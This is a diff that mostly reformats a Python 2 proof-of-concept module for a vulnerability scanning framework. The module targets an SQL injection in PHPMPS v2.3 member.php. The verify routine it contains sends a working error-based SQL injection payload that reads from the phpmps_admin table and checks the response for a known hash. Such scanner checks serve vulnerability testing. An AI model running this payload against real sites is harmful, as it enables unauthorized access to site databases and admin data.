@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPMPS_0002' # 平台漏洞编号，留空
+    vuln_id = 'PHPMPS_0002'  # 平台漏洞编号，留空
     name = 'PHPMPS v2.3 member.php 422 - 455 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-04-01'  # 漏洞公布时间
     desc = '''
         member.php 422 - 455 行的代码使用了extract($_REQUEST);
@@ -36,21 +37,22 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/phpmps/member.php?act=check_info_gold&table=phpmps_member'
             data = "%20where%201=1%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28select%20md5(c)%20from%20phpmps_admin%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23"
             url = self.target + payload + data
             r = requests.get(url)
 
             if '4a8a08f09d37b73795649038408b5f33' in r.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
